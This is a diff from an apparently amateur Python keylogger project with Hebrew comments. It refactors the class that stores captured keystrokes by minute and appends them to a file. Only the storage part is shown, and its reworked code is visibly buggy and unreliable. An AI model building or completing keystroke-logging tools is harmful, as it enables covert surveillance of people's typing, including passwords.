@@ -44,8 +44,8 @@ class KeyLogger:
 
 
 
-
-class Writer(ABC):
+#  מחלקת כותב. מורישה מתודה של כתוב ומתודה של שלח
+class IWriter(ABC):
     @abstractmethod
     def write(key: str):
         pass
@@ -55,20 +55,28 @@ class Writer(ABC):
 
 
 
-#  מחלקת כותב. מורישה מתודה של כתוב ומתודה של שלח
 # .מחלקת כתיבה לקובץ. מקבלת נתיב של הקובץ
 # .מתודת כתוב: כותבת הקשות מקלדת למילון ששומר דקות וטקסט 
 # מתודת שלח: שולחת את המילון לקובץ.
-class FileWriter(Writer):
-    def __init__(self, file_path):
-        self.text_dict = {}
-        self.cur_min = datetime.now().strftime('%Y-%m-%d %H:%M')
-        self.file_path = file_path
+class FileWriter(IWriter):
+
+    def __init__(self):
+        self.text_dict = {}        
+        self.file_path = ""
+
+    @staticmethod
+    def cur_min():
+        return datetime.now().strftime("%d/%m/%Y, %H:%M")
+
     def write(self, key: str):
         if self.cur_min not in self.text_dict:
             self.text_dict[self.cur_min] = key
         else:
             self.text_dict[self.cur_min] += key
+
+    def add_file_path(self):
+        self.file_path = ""
+
     def send(self, buffer):
         with open(self.file_path, "a") as file:
             file.write(self.text_dict)
